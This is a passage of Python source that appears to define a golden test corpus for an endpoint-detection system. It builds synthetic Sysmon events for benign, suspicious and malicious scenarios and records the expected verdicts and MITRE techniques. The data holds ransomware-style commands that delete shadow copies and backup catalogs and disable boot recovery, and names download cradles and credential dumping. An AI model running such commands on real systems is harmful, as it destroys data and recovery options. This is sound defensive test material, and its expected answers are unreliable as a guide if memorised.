        _sysmon_proc(0, HOST, r"C:\Users\Public\akira.exe",
                     "akira.exe -p C:\\Share --encrypt", r"C:\Windows\System32\cmd.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\vssadmin.exe",
                     "vssadmin.exe delete shadows /all /quiet",
                     r"C:\Users\Public\akira.exe"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\wbadmin.exe",
                     "wbadmin.exe delete catalog -quiet",
                     r"C:\Users\Public\akira.exe"),
        _sysmon_proc(6, HOST, r"C:\Windows\System32\bcdedit.exe",
                     "bcdedit.exe /set {default} recoveryenabled No",
                     r"C:\Users\Public\akira.exe"),
    ]
    for i in range(15):
        events.append(_sysmon_file(8 + i, HOST, r"C:\Users\Public\akira.exe",
                                     rf"C:\Share\proj_{i}.docx.akira"))
    events.append(_sysmon_file(25, HOST, r"C:\Users\Public\akira.exe",
                                 r"C:\Share\readme.txt"))
    return events


def _ds_lockbit() -> list[CanonicalEventRecord]:
    HOST = "SRV-FILE-02"
    events = [
        _sysmon_proc(0, HOST, r"C:\Users\Public\lockbit.exe",
                     "lockbit.exe", r"C:\Windows\explorer.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\vssadmin.exe",
                     "vssadmin.exe delete shadows /all /quiet",
                     r"C:\Users\Public\lockbit.exe"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\net.exe",
                     "net.exe stop MSSQLSERVER /y",
                     r"C:\Users\Public\lockbit.exe"),
        _sysmon_proc(5, HOST, r"C:\Windows\System32\wbadmin.exe",
                     "wbadmin.exe delete catalog -quiet",
                     r"C:\Users\Public\lockbit.exe"),
    ]
    for i in range(18):
        events.append(_sysmon_file(8 + i, HOST, r"C:\Users\Public\lockbit.exe",
                                     rf"C:\Data\file_{i}.xlsx.lockbit"))
    events.append(_sysmon_file(28, HOST, r"C:\Users\Public\lockbit.exe",
                                 r"C:\Data\Restore-My-Files.txt"))
    return events


def _ds_black_basta() -> list[CanonicalEventRecord]:
    HOST = "SRV-FILE-03"
    events = [
        _sysmon_proc(0, HOST, r"C:\Users\Public\basta.exe",
                     "basta.exe -disableshadow", r"C:\Windows\System32\cmd.exe"),
        _sysmon_proc(2, HOST, r"C:\Windows\System32\vssadmin.exe",
                     "vssadmin.exe delete shadows /all /quiet",
                     r"C:\Users\Public\basta.exe"),
        _sysmon_proc(4, HOST, r"C:\Windows\System32\bcdedit.exe",
                     "bcdedit.exe /set {default} recoveryenabled No",
                     r"C:\Users\Public\basta.exe"),
    ]
    for i in range(12):
        events.append(_sysmon_file(6 + i, HOST, r"C:\Users\Public\basta.exe",
                                     rf"C:\Data\file_{i}.pdf.basta"))
    events.append(_sysmon_file(20, HOST, r"C:\Users\Public\basta.exe",
                                 r"C:\Data\readme.txt"))
    return events


GOLDEN_CORPUS: dict[str, GoldenDataset] = {
    # ─── Benign (13) ─────────────────────────────────────────────────
    "clean_workstation": GoldenDataset(
        id="clean_workstation", label="Clean workstation",
        description="Windows boot · Explorer · Chrome · Office · Teams · Defender · Windows Update",
        expected_verdict="benign", category="benign", build=_ds_clean,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_story_sequence=("benign",),
            expected_false_positive=True,
            expected_processes=("chrome.exe", "svchost.exe"))),
    "clean_server": GoldenDataset(
        id="clean_server", label="Clean Windows Server",
        description="services.exe · svchost · LogonUI · normal boot chain",
        expected_verdict="benign", category="benign", build=_ds_clean_server,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=30,
            expected_story_sequence=("benign",),
            expected_false_positive=True,
            expected_processes=("services.exe", "svchost.exe"))),
    "defender_scan": GoldenDataset(
        id="defender_scan", label="Microsoft Defender scan",
        description="MsMpEng launches MpCmdRun for a quick scan",
        expected_verdict="benign", category="benign", build=_ds_defender_scan,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True,
            expected_processes=("MsMpEng.exe", "MpCmdRun.exe"))),
    "intune_deploy": GoldenDataset(
        id="intune_deploy", label="Intune app deployment",
        description="IntuneWindowsAgent invokes MsiExec for authorized software",
        expected_verdict="benign", category="ambiguous", build=_ds_intune_deploy,
        expectations=ExpectedInvestigation(
            # Intune → msiexec is legitimate admin, but the frozen v3.1b
            # scores msiexec-executed installs as informational. This is
            # exactly what IKB expansion targets (Phase 5 baseline).
            device_score_max=35,
            expected_false_positive=True,
            expected_iocs=("manage.microsoft.com",))),
    "onedrive_sync": GoldenDataset(
        id="onedrive_sync", label="OneDrive sync",
        description="OneDrive.exe syncing user documents",
        expected_verdict="benign", category="benign", build=_ds_onedrive_sync,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True,
            expected_iocs=("onedrive.live.com",))),
    "chrome_update": GoldenDataset(
        id="chrome_update", label="Chrome auto-update",
        description="GoogleUpdate.exe downloading a Chrome delta",
        expected_verdict="benign", category="benign", build=_ds_chrome_update,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True,
            expected_iocs=("update.googleapis.com",))),
    "windows_update": GoldenDataset(
        id="windows_update", label="Windows Update",
        description="wuauserv + TrustedInstaller applying a patch",
        expected_verdict="benign", category="benign", build=_ds_windows_update,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=30,
            expected_false_positive=True,
            expected_iocs=("windowsupdate.microsoft.com",))),
    "vmware_tools": GoldenDataset(
        id="vmware_tools", label="VMware Tools",
        description="vmtoolsd + VMwareResolutionSet on a VM",
        expected_verdict="benign", category="benign", build=_ds_vmware_tools,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True)),
    "citrix": GoldenDataset(
        id="citrix", label="Citrix Workspace",
        description="wfica32 connecting to a Citrix broker",
        expected_verdict="benign", category="benign", build=_ds_citrix,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True)),
    "vpn_client": GoldenDataset(
        id="vpn_client", label="Cisco AnyConnect VPN",
        description="vpnui + vpnagent connecting to corporate VPN",
        expected_verdict="benign", category="benign", build=_ds_vpn_client,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True)),
    "backup_agent": GoldenDataset(
        id="backup_agent", label="Veeam backup agent",
        description="VeeamAgent writing a daily backup archive",
        expected_verdict="benign", category="benign", build=_ds_backup_agent,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=30,
            expected_false_positive=True)),
    "monitoring_agent": GoldenDataset(
        id="monitoring_agent", label="Microsoft Monitoring Agent",
        description="MMA MonitoringHost.exe reporting to opsmgr",
        expected_verdict="benign", category="benign", build=_ds_monitoring_agent,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=25,
            expected_false_positive=True)),
    "enterprise_admin": GoldenDataset(
        id="enterprise_admin", label="Enterprise administration",
        description="SCCM / PsExec / WMI / WinRM · legitimate admin activity",
        expected_verdict="benign", category="ambiguous", build=_ds_enterprise_admin,
        expectations=ExpectedInvestigation(
            verdict="benign", device_score_max=35,
            expected_false_positive=True,
            expected_processes=("PsExec.exe",))),

    # ─── Suspicious (8) ──────────────────────────────────────────────
    "powershell_encoded": GoldenDataset(
        id="powershell_encoded", label="Encoded PowerShell",
        description="powershell.exe -EncodedCommand with a long base64 payload",
        expected_verdict="suspicious", category="suspicious", build=_ds_powershell_encoded,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1059.001", "T1027"),
            expected_story_sequence=("powershell", "encoded_execution"),
            expected_processes=("powershell.exe",))),
    "lolbas_certutil": GoldenDataset(
        id="lolbas_certutil", label="certutil download cradle",
        description="certutil -urlcache -split -f http://…/payload.exe",
        expected_verdict="suspicious", category="suspicious", build=_ds_lolbas_certutil,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1105",),
            expected_story_sequence=("download",),
            expected_processes=("certutil.exe",))),
    "mshta": GoldenDataset(
        id="mshta", label="mshta javascript execution",
        description="mshta.exe javascript:… Exec()",
        expected_verdict="suspicious", category="suspicious", build=_ds_mshta,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1218.005",),
            expected_processes=("mshta.exe",))),
    "wscript_download": GoldenDataset(
        id="wscript_download", label="wscript downloader",
        description="wscript.exe running a .js downloader",
        expected_verdict="suspicious", category="suspicious", build=_ds_wscript_download,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1059.005",),
            expected_processes=("wscript.exe",))),
    "rundll32_abuse": GoldenDataset(
        id="rundll32_abuse", label="rundll32 javascript abuse",
        description="rundll32 javascript:mshtml.dll,RunHTMLApplication …",
        expected_verdict="suspicious", category="suspicious", build=_ds_rundll32_abuse,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1218.011",),
            expected_processes=("rundll32.exe",))),
    "regsvr32_scrobj": GoldenDataset(
        id="regsvr32_scrobj", label="regsvr32 /i:http scrobj.dll",
        description="Squibblydoo · regsvr32 fetching a remote .sct",
        expected_verdict="suspicious", category="suspicious", build=_ds_regsvr32_scrobj,
        expectations=ExpectedInvestigation(
            device_score_min=10,
            expected_mitre=("T1218.010",),
            expected_processes=("regsvr32.exe",))),
    "office_macro_only": GoldenDataset(
        id="office_macro_only", label="Office macro → cmd (benign body)",
        description="Word spawns cmd.exe with a harmless payload — parent-child alone",
        expected_verdict="suspicious", category="suspicious", build=_ds_office_macro_only,
        expectations=ExpectedInvestigation(
            device_score_min=1,          # weak signal — parent-child alone
            expected_story_sequence=("office_spawn",),
            expected_parent_child=(("winword.exe", "cmd.exe"),))),
    "onenote_phish": GoldenDataset(
        id="onenote_phish", label="OneNote → wscript phishing",
        description="ONENOTE.EXE spawns wscript.exe against a .vbs attachment",
        expected_verdict="suspicious", category="suspicious", build=_ds_onenote_phish,
        expectations=ExpectedInvestigation(
            device_score_min=1,
            expected_mitre=("T1059.005",),
            expected_story_sequence=("office_spawn",),
            expected_parent_child=(("onenote.exe", "wscript.exe"),))),

    # ─── Malicious (13) ──────────────────────────────────────────────
    "office_phishing": GoldenDataset(
        id="office_phishing", label="Office phishing → PowerShell → persistence",
        description="Word macro → wscript → cmd → encoded PowerShell → download → Run key",
        expected_verdict="critical", category="malicious", build=_ds_office_phishing,
        expectations=ExpectedInvestigation(
            device_score_min=40,
            expected_mitre=("T1059.001", "T1547.001"),
            expected_story_sequence=("office_spawn", "powershell", "persistence"),
            expected_story_keywords=("Run key",),
            expected_processes=("winword.exe", "powershell.exe"),
            expected_parent_child=(("winword.exe", "wscript.exe"),))),
    "cobalt_strike": GoldenDataset(
        id="cobalt_strike", label="Cobalt Strike-style intrusion",
        description="PowerShell beacon → rundll32 → LSASS dump → service persistence → lateral WinRM",
        expected_verdict="critical", category="malicious", build=_ds_cobalt_strike,
        expectations=ExpectedInvestigation(
            verdict="critical", device_score_min=60,
            expected_mitre=("T1003.001", "T1218.011", "T1021.006"),
            expected_story_sequence=("powershell", "credential_access", "lateral_movement"),
            expected_processes=("powershell.exe", "rundll32.exe", "lsass.exe"))),
    "ransomware": GoldenDataset(
        id="ransomware", label="Generic ransomware",
        description="Shadow copy deletion · backup destruction · mass file encryption · ransom note",
        expected_verdict="critical", category="malicious", build=_ds_ransomware,
        expectations=ExpectedInvestigation(
            device_score_min=40,
            expected_mitre=("T1490", "T1486"),
            expected_story_sequence=("impact",),
            expected_processes=("vssadmin.exe", "wbadmin.exe", "bcdedit.exe"))),
    "info_stealer": GoldenDataset(
        id="info_stealer", label="Generic info-stealer",
        description="Browser credential access · archive creation · HTTPS exfiltration · Run-key persistence",
        expected_verdict="critical", category="malicious", build=_ds_info_stealer,
        expectations=ExpectedInvestigation(
            device_score_min=25,
            expected_mitre=("T1547.001",),
            expected_story_sequence=("persistence",))),
    "lumma": GoldenDataset(
        id="lumma", label="Lumma stealer",
        description="Setup.exe → Chrome Login Data + Cookies → HTTPS exfil → Run key",
        expected_verdict="critical", category="malicious", build=_ds_lumma,
        expectations=ExpectedInvestigation(
            device_score_min=25,
            expected_mitre=("T1547.001",),
            expected_story_sequence=("persistence",))),
    "bumblebee": GoldenDataset(
        id="bumblebee", label="Bumblebee loader",
        description="msiexec launches rundll32-hosted DLL → C2 beacon",
        expected_verdict="critical", category="malicious", build=_ds_bumblebee,
        expectations=ExpectedInvestigation(
            device_score_min=20,
            expected_mitre=("T1218.007", "T1218.011"),
            expected_story_sequence=("c2",),
            expected_processes=("msiexec.exe", "rundll32.exe"))),
    "icedid": GoldenDataset(
        id="icedid", label="IcedID via .chm",
        description="hh.exe (CHM viewer) → rundll32 loader → C2",
        expected_verdict="critical", category="malicious", build=_ds_icedid,
        expectations=ExpectedInvestigation(
            device_score_min=15,
            expected_mitre=("T1218.011",),
            expected_processes=("rundll32.exe",))),
    "qakbot": GoldenDataset(
        id="qakbot", label="QakBot via Excel macro",
        description="EXCEL → regsvr32 → C2 → Run-key persistence",
        expected_verdict="critical", category="malicious", build=_ds_qakbot,
        expectations=ExpectedInvestigation(
            device_score_min=30,
            expected_mitre=("T1218.010", "T1547.001"),
            expected_story_sequence=("office_spawn", "persistence"),
            expected_parent_child=(("excel.exe", "regsvr32.exe"),))),
    "asyncrat": GoldenDataset(
        id="asyncrat", label="AsyncRAT",
        description="RAT dropper → Run-key persistence → non-standard C2 port",
        expected_verdict="critical", category="malicious", build=_ds_asyncrat,
        expectations=ExpectedInvestigation(
            device_score_min=20,
            expected_mitre=("T1547.001",),
            expected_story_sequence=("persistence",))),
    "remcos": GoldenDataset(
        id="remcos", label="Remcos RAT",
        description="Installer → encoded PowerShell → RAT C2 → Run-key persistence",
        expected_verdict="critical", category="malicious", build=_ds_remcos,
        expectations=ExpectedInvestigation(
            device_score_min=30,
            expected_mitre=("T1547.001", "T1059.001"),
            expected_story_sequence=("encoded_execution", "persistence"))),
    "akira": GoldenDataset(
        id="akira", label="Akira ransomware",
        description="vssadmin + wbadmin + bcdedit + mass encryption + readme.txt",
        expected_verdict="critical", category="malicious", build=_ds_akira,
        expectations=ExpectedInvestigation(
            device_score_min=45,
            expected_mitre=("T1490", "T1486"),
            expected_story_sequence=("impact",),
            expected_processes=("vssadmin.exe", "wbadmin.exe"))),
    "lockbit": GoldenDataset(
        id="lockbit", label="LockBit ransomware",
        description="Shadow copy delete + service kill + backup delete + mass encryption",
        expected_verdict="critical", category="malicious", build=_ds_lockbit,
        expectations=ExpectedInvestigation(
            device_score_min=45,
            expected_mitre=("T1490", "T1486"),
            expected_story_sequence=("impact",),
            expected_processes=("vssadmin.exe", "wbadmin.exe"))),
    "black_basta": GoldenDataset(
        id="black_basta", label="Black Basta ransomware",
        description="vssadmin + bcdedit + mass encryption with .basta extension",
        expected_verdict="critical", category="malicious", build=_ds_black_basta,
        expectations=ExpectedInvestigation(
            device_score_min=45,
            expected_mitre=("T1490", "T1486"),
            expected_story_sequence=("impact",))),
}


def list_datasets() -> list[dict]:
    return [{
        "id": d.id, "label": d.label,
        "description": d.description,
        "expected_verdict": d.expected_verdict,
        "category": d.category,
        "event_count": len(d.records()),
    } for d in GOLDEN_CORPUS.values()]


def get_dataset(dataset_id: str) -> GoldenDataset | None:
    return GOLDEN_CORPUS.get(dataset_id)
